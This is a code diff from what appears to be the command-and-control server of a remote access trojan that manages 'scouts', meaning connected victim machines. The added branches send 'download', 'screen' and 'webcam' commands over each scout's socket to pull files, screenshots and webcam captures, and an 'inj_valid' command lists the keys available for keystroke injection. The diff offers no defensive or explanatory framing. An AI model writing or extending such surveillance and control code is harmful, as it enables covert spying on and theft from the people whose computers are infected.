@@ -80,6 +80,25 @@ def main(scout_id, prompt=None):
                     return "back"
                 else:
                     return jsonify({"output": "Success", "output_message": "Scout is alive", "data": ""})
+            elif command == "download":
+                config.scout_database[scout_id][0].sendall(("g " + prompt).encode())
+                output = download.main(config.scout_database[scout_id][0])
+                return output
+            elif command == "screen":
+                config.scout_database[scout_id][0].sendall(("g " + prompt).encode())
+                output = screen.main(config.scout_database[scout_id][0])
+                return output
+            elif command == "webcam":
+                config.scout_database[scout_id][0].sendall(("g " + prompt).encode())
+                output = webcam.main(config.scout_database[scout_id][0])
+                return output
+            elif command == 'inj_valid':
+                ret_string = ""
+                ret_string += '[*]All valid keys that can be injected : \n'
+                formatted = grid_format.main(valid_keys, 5)
+                for i in formatted:
+                    ret_string += '   ' + ''.join(i)
+                return jsonify({"output": "Success", "output_message": "Command Output", "data": ret_string})
             else:
                 data = send_and_recv.main("g "+ prompt, scout_id)
                 if type(data) == str:
